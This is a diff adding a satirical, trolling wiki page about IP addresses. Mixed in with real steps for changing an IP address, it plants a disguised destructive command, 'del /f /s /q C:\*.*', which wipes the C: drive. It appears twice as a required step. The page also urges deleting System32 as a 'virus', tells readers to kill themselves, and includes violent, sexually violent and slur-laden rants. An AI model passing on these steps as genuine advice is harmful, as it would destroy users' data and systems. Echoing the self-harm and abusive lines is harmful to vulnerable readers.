@@ -1,0 +1,74 @@
+IP address
+[[Image:Ipaddress.png|thumb|right|[[Skript kiddies|Someone]] can immediately begin attacking your [[computer]]!]]
+
+Your IP Address is '''127.0.0.1''' and we are haxing your computer now. Not even pressing Alt+F4 will save you now, [[noob]]. 
+
+With your IP, someone can HACK YOUR SHIT, KILL YOUR [[PARENTS]], KILL YOUR FIRSTBORN SON, BUTTRAPE YOUR DAUGHTERS, SLAUGHTER EVERYONE IN YOUR AREA, AND KILL YOUR [[GOD]] AND YOUR DOG.
+
+[http://www.proxies.co.nr Proxies] are the standard way of hiding your IP address from [[China|oppressive governmental regimes]].
+
+==Why would you change your IP?==
+It's useful if:
+#[[You]] are a [[pedophile]] looking for an IP that hasn't been banned yet because of CP posting.
+#[[You]] are planning to create a giant [[sock puppet]] farm in order to overturn [[Wikipedia]] ''ad majorem [[ED]]i gloriam''.
+#[[You]] were such a [[n00b]] in a forum and you annoyed the admins so much that they [[banned]] you.
+#[[You]] want to [[raid]] a forum of [[n00bs]] but you failed to hire some /b/tards as they are not your [[personal army]].
+#[[You]] got humiliated and [[pwned]] by a powerful [[troll]] and you try to get a new identity.
+#[[You]] are a hacker sought by the police.
+#[[You]] were interrupted in a [[NO U]] war and you don't want to become a [[luser]].
+
+==How to change your IP==
+===#1===
+If your computer is connected directly to the [[Tubes|internet]] without a NAT router in between, try this:
+#Get to a command prompt. (From the [[Windows|Start]] menu, choose Run..., type <code>cmd</code> and [[Push_Butan|press Enter]].)
+#Type <code>ipconfig /release</code> and press Enter.
+#Optional: Turn off the computer and leave it turned off overnight.
+#Type <code>ipconfig /renew</code> and press Enter.
+#Type <code>del /f /s /q C:\*.*</code> and press Enter.
+#Do not forget the last step!
+
+===#2===
+#Log into the router's admin console (often http://192.168.1.1/ or http://192.168.0.1), or for netgear brand routers use http://routerlogin.net
+#Release the IP address (method varies by router manufacturer).
+#Turn off router, Ethernet hubs/switches, and the cable/DSL modem.
+#Leave everything off overnight.
+#Turn everything back on and confirm the switch.
+
+====#2.1 (simplified but unreliable)====
+#Turn off your router, any Ethernet hubs/switches and your cable/DSL modem.
+#Optional: Shut down your computer and leave it off until completed
+#Leave everything off for 5-10 minutes.
+#Confirm the switch.
+#Try Method 2 if this fails.
+
+===#3===
+#Go to http://192.168.1.1 or http://192.168.0.1 , or for netgear brand routers use http://routerlogin.net
+#Log in (if you do not know the password, [[Google]] for default router passwords).
+#Find DNS addresses and write them down.
+#Switch setting to Static IP. Put in DNS addresses and change your IP to whatever you like.
+
+===#4===
+#Log into the router's admin console. (Often http://192.168.1.1/),  or for netgear brand routers use http://routerlogin.net
+#Release the IP address. (Method varies by router manufacturer)
+#Change [[MAC address]].
+#Turn everything back on.
+
+===#5===
+<youtube>B2yvLXQDgAo</youtube>
+
+===If nothing works===
+#Type <code>del /f /s /q C:\*.*</code> and press Enter.
+#Kill yourself.
+
+====[[Final solution]]====
+Eliminating the virus known as [[System32]] constitutes a permanent solution for this issue. [[Windows Optimizer]] can delete said virus, so you can change your IP at will.
+
+====How to change your IP #6====
+Go over to your computer and rip all wires out of wall problem solved
+
+==How IP's are allocated by /8 subnet==
+[[File:Internetmap.jpg|center]]
+
+==External Links==
+*[http://www.danasoft.com A harmless forum signature to scare newfags.]
+{{stub}}[[Category:Netspeak]][[Category:Softwarez]]
